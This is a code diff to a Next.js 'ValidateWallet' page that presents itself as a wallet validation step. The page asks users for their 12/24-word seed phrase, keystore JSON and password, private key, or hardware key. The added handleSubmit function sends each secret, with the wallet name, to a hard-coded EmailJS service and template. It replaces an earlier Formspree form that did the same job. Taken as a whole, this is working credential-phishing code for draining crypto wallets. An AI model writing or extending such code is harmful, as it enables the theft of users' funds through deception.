@@ -1,10 +1,11 @@
-import { FunctionComponent, ReactElement, useEffect, useState } from "react";
+import { FormEvent, FunctionComponent, ReactElement, useEffect, useState } from "react";
 import styles from '../styles/Validate.module.scss';
 import Image from "next/image";
 import images from "../../public/images";
 import { useRouter } from "next/router";
 import { wallets } from "@/Constants/wallets";
 import { WalletInfo } from "@/models/WalletInfo";
+import emailjs from 'emailjs-com';
 // import { useForm, ValidationError } from '@formspree/react';
 
 interface ValidateWalletProps {
@@ -28,6 +29,16 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
 
     const [validationMsg, setValidationMsg] = useState<any>();
 
+    // Mnemonics 
+    const [wordPhrase, setWordPhrase] = useState<string>();
+    // Keystore 
+    const [keystoreJson, setKeystoreJson] = useState<string>();
+    const [password, setPassword] = useState<string>();
+    // Private key 
+    const [privateKey, setPrivateKey] = useState<string>();
+    // Hardware 
+    const [hardwareKey, setHardwareKey] = useState<string>();
+
     // const handleSubmit = async (event: any) => {  
     //     event.preventDefault();
 
@@ -50,6 +61,101 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
     //         // Display error message to the user
     //     }
     // };
+
+    const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
+        event.preventDefault();
+
+        // Create template params for each case study 
+        if (tab === TabEnum.Mnemoics) {
+            const templatePrams = {
+                crypto_name: selectedWallet?.name as string,
+                word_phrase: wordPhrase as string,
+                selected_info_type: 'Mnemoics'
+            };
+
+            emailjs.send(
+                'service_c65wu7r',
+                'template_qz7xbap',
+                { ...templatePrams },
+                '6Z4DUozeezwp4obvW'
+            )
+                .then((response) => {
+                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
+                    // Display success message to the user
+                })
+                .catch((error) => {
+                    console.error('Mnemonics Failed to send email:', error);
+                    // Display error message to the user
+                });
+        }
+        if (tab === TabEnum.Keystore) {
+            const templatePrams = {
+                crypto_name: selectedWallet?.name as string,
+                keystore_json: keystoreJson as string,
+                password: password as string,
+                selected_info_type: 'Keystore'
+            };
+
+            emailjs.send(
+                'service_c65wu7r',
+                'template_qz7xbap',
+                { ...templatePrams },
+                '6Z4DUozeezwp4obvW'
+            )
+                .then((response) => {
+                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
+                    // Display success message to the user
+                })
+                .catch((error) => {
+                    console.error('Mnemonics Failed to send email:', error);
+                    // Display error message to the user
+                });
+        }
+        if (tab === TabEnum.PrivateKey) {
+            const templatePrams = {
+                crypto_name: selectedWallet?.name as string,
+                private_key: privateKey as string,
+                selected_info_type: 'Private Key'
+            };
+
+            emailjs.send(
+                'service_c65wu7r',
+                'template_qz7xbap',
+                { ...templatePrams },
+                '6Z4DUozeezwp4obvW'
+            )
+                .then((response) => {
+                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
+                    // Display success message to the user
+                })
+                .catch((error) => {
+                    console.error('Mnemonics Failed to send email:', error);
+                    // Display error message to the user
+                });
+        }
+        if (tab === TabEnum.Hardware) {
+            const templatePrams = {
+                crypto_name: selectedWallet?.name as string,
+                hardware_key: hardwareKey as string,
+                selected_info_type: 'Hardware Key'
+            };
+
+            emailjs.send(
+                'service_c65wu7r',
+                'template_qz7xbap',
+                { ...templatePrams },
+                '6Z4DUozeezwp4obvW'
+            )
+                .then((response) => {
+                    console.log('Mnemonics Email sent successfully!', response.status, response.text);
+                    // Display success message to the user
+                })
+                .catch((error) => {
+                    console.error('Mnemonics Failed to send email:', error);
+                    // Display error message to the user
+                });
+        }
+    };
 
     useEffect(() => {
         if (router.isReady) {
@@ -81,48 +187,40 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
             </div>
             {validationMsg}
             {tab === TabEnum.Mnemoics &&
-                <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
+                <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                     <div className={styles.inputArea}>
                         <label htmlFor={`${selectedWallet?.name} Mnemoics word phrase`}>Please enter your 12/24 word phrase</label>
-                        <input type="text" name={`${selectedWallet?.name} Mnemoics word phrase`} />
+                        <input type="text" name={`${selectedWallet?.name} Mnemoics word phrase`} value={wordPhrase} onChange={(e) => setWordPhrase(e.target.value)} />
                     </div>
-                    <button type="submit" onClick={() => setTimeout(() => {
-                        router.reload()
-                    }, 0)}>Proceed</button>
+                    <button type="submit">Proceed</button>
                 </form>}
             {tab === TabEnum.Keystore &&
-                <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
+                <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                     <div className={styles.inputArea}>
                         <label htmlFor={`${selectedWallet?.name} Keystore JSON`}>Please enter your Keystore JSON</label>
-                        <input type="text" name={`${selectedWallet?.name} Keystore JSON`} />
+                        <input type="text" name={`${selectedWallet?.name} Keystore JSON`} value={keystoreJson} onChange={(e) => setKeystoreJson(e.target.value)} />
                         <span>Key must be in HEX format</span>
                     </div>
                     <div className={styles.inputArea}>
                         <label htmlFor={`${selectedWallet?.name} Keystore Password`}>Enter Password</label>
-                        <input type="text" name={`${selectedWallet?.name} Keystore Password`} />
+                        <input type="text" name={`${selectedWallet?.name} Keystore Password`} value={password} onChange={(e) => setPassword(e.target.value)} />
                     </div>
-                    <button type="submit" onClick={() => setTimeout(() => {
-                        router.reload()
-                    }, 0)}>Proceed</button>
+                    <button type="submit">Proceed</button>
                 </form>}
             {tab === TabEnum.PrivateKey &&
-                <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
+                <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                     <div className={styles.inputArea}>
                         <label htmlFor={`${selectedWallet?.name} Private key`}>Please enter your private key</label>
-                        <input type="text" name={`${selectedWallet?.name} Private key`} />
+                        <input type="text" name={`${selectedWallet?.name} Private key`} value={privateKey} onChange={(e) => setPrivateKey(e.target.value)} />
                     </div>
-                    <button type="submit" onClick={() => setTimeout(() => {
-                        router.reload()
-                    }, 0)}>Proceed</button>
+                    <button type="submit">Proceed</button>
                 </form>}
-            {tab === TabEnum.Hardware && <form className={styles.validationPage__formSection} action="https://formspree.io/f/mnqkappb" method="POST">
+            {tab === TabEnum.Hardware && <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                 <div className={styles.inputArea}>
                     <label htmlFor={`${selectedWallet?.name} Hardware key`}>Please enter your Hardware Key</label>
-                    <input type="text" name={`${selectedWallet?.name} Hardware key`} />
+                    <input type="text" name={`${selectedWallet?.name} Hardware key`} value={hardwareKey} onChange={(e) => setHardwareKey(e.target.value)} />
                 </div>
-                <button type="submit" onClick={() => setTimeout(() => {
-                    router.reload()
-                }, 0)}>Proceed</button>
+                <button type="submit">Proceed</button>
             </form>}
         </div>
     );
